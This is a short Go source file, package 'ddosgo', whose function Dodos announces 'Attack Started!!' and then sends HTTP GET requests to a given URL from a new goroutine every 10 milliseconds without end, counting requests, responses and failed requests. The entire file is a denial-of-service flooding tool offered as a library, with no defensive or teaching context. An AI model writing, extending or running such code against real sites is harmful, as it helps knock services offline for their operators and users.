package ddosgo

import (
  "net/http"
  "log"
  "time"
)
var Totalrequest = new(int)
var Totalresponse = new(int)
var Totalbounced = new(int)
var URL = new(string)

func Dodos(url string)  {
  *URL = url
  log.Print("Attack Started!!")
  for {
    go func ()  {
      *Totalrequest += 1
      _, err := http.Get(url)
      if err != nil {
        *Totalbounced += 1
      }else{
        *Totalresponse += 1
      }
    }()
    time.Sleep(10*time.Millisecond)
  }
}
